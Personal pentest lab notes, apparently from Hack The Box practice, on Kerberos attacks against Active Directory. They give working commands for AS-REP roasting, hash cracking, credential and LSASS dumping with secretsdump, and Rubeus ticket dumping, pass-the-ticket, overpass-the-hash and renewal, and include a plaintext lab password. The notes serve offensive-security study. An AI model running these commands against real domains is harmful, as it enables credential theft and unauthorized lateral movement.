Port 88

## Have list of users 
#### identify accounts that do not require Kerberos pre-authentication:
```
GetNPUsers.py -dc-ip 10.129.175.196 -request -usersfile users.txt htb.local/
```
crack hashes:
```
hashcat -m 18200 <hashes-file> /path/to/wordlist
```

---
## Have creds or foothold
#### Dump creds, including NTLM hashes, kerberos tickets, passwords:
```
secretsdump.py corp.local/admin:password@192.168.1.100
```
- requires admin
#### Obtained LSASS dump file and want to extract creds from it:
```
python secretsdump.py -lsass <LSASS-Dump-File>
```

### Rubeus
#### Extract Kerberos tickets (TGT/TGS) for lateral movement
transfer rubeus.exe to windows and run:
```
Rubeus.exe dump
```

#### Extract kerberos/lsass info (similar to dump but more info):
```
Rubeus.exe harvest
```
- requires admin
#### Extracted Kerberos ticket and want to use it to access resources without password (pass-the-ticket):
```
Rubeus.exe ptt /ticket:<base64-ticket>
```

#### Have NTLM hash of user's pw and want to obtain kerberos ticket using the hash:
```
Rubeus.exe asktgt /user:<username> /rc4:<ntlm-hash> /domain:<domain> /dc:<domain-controller>
```
ex:
```
Rubeus.exe asktgt /user:jdoe /rc4:ab1234567890abcdef1234567890abcdef /domain:corp.local /dc:192.168.1.100
```

#### if rubeus dump shows a TGT with a renewable flag set, output example:
  [TGT]  ServiceName              :  krbtgt/EXAMPLE.COM
         PrincipalName            :  user@EXAMPLE.COM
         Realm                    :  EXAMPLE.COM
         StartTime                :  2/24/2024 1:22:40 AM
         EndTime                  :  2/24/2024 11:22:40 AM
         ==RenewTill==                :  3/2/2024 1:22:40 AM
         Flags                    :  ==renewable==, pre_authent
         SessionKeyType           :  aes256_cts_hmac_sha1
         Base64(ticket)           :  YIIEjAYGKwYBB...

can renew the ticket with:
```
Rubeus.exe renew /ticket:YIIEjAYGKwYBB...
```

can pass the ticket with:
```
Rubeus.exe ptt /ticket:YIIEjAYGKwYBB...
```


#### SSH permission denied gssapi-with-mic error
![[Pasted image 20250423154335.png]]
- got ticket but SSH fails with creds
```
sudo ntpdate frizzdc.frizz.htb
```
```
getTGT.py frizz.htb/f.frizzle:'Jenni_Luvs_Magic23' -dc-ip frizzdc.frizz.htb
```
```
export KRB5CCNAME=f.frizzle.ccache
```
![[Pasted image 20250423154451.png]]
- `kinit` works
```
kinit f.frizzle@FRIZZ.HTB
```
```
klist
```
```
ssh f.frizzle@frizz.htb -K
```